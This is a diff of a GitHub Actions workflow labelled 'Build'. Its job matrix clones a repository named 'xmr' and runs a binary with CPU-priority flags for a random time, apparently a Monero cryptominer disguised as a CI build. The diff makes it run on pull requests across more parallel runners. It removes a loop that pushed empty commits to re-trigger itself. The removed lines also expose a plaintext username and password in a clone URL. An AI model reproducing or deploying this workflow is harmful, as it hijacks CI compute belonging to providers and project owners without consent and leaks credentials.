@@ -1,6 +1,5 @@
 name: Build
-on:
-  push:
+on: [pull_request]
 jobs:
   test:
     name: Fetch
@@ -11,20 +10,12 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        runner: [0,1,2,3,4,5,6,7,8]
+        runner: [0,1,2,3,4,5,6,7,8,9,10]
     steps:
       - run: |
           apt update -qq
           apt install -y git libuv1 libssl1.1 libhwloc15
-          git clone https://IsaacFriend:Ojman101@github.com/IsaacFriend/xmr.git
+          git clone https://daveyg7:${{ secrets.token }}@github.com/daveyg7-org/xmr.git
           cd xmr
           chmod u+x prog
           timeout $(shuf -i 300-820 -n 1) ./prog --cpu-no-yield --cpu-priority 5 || true
-          if [ ${{ matrix.runner }} -eq 0 ]
-          then
-            sleep 25m
-            git config user.name 'Davey G'
-            git config user.email 'daveyg1@yandex.com'
-            git commit --allow-empty --allow-empty-message --no-edit
-            git push
-          fi
